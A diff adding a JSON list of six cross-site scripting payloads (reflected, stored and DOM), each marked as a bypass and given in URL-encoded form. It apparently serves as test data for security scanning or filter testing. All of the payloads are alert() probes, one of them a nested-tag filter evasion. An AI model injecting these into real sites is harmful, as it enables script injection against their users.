@@ -1,0 +1,38 @@
+[
+  {
+    "Type": "Reflected",
+    "Payload": "<script>alert(1)</script>",
+    "Bypass": true,
+    "Encoded": "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+  },
+  {
+    "Type": "Stored",
+    "Payload": "<input autofocus onfocus=alert(1)>",
+    "Bypass": true,
+    "Encoded": "%3Cinput+autofocus+onfocus%3Dalert%281%29%3E"
+  },
+  {
+    "Type": "DOM",
+    "Payload": "<img src=x onerror=alert(1)>",
+    "Bypass": true,
+    "Encoded": "%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E"
+  },
+  {
+    "Type": "Reflected",
+    "Payload": "<iframe srcdoc=\"<script>alert(2)</script>\">",
+    "Bypass": true,
+    "Encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%282%29%3C%2Fscript%3E%22%3E"
+  },
+  {
+    "Type": "Stored",
+    "Payload": "<body onload=alert(2)>",
+    "Bypass": true,
+    "Encoded": "%3Cbody+onload%3Dalert%282%29%3E"
+  },
+  {
+    "Type": "DOM",
+    "Payload": "<scr<script>ipt>alert(2)</scr</script>ipt>",
+    "Bypass": true,
+    "Encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+  }
+]
